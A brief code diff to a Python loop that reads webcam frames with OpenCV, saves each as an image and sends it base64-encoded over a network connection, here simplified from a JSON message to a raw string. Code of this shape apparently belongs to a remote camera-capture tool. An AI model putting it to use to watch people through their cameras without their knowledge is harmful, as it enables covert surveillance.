@@ -15,10 +15,9 @@ while True:
     return_value, image = camera.read()
     cv2.imwrite('opencv.png', image)
     with open('opencv.png', mode='rb') as file:
-        connection.send({
-            "command": "camera",
-            "data": str(base64.b64encode(file.read()))
-        })
+        connection.send(
+            str(base64.b64encode(file.read()))
+        )
     sleep(1000)
 
 del(camera)
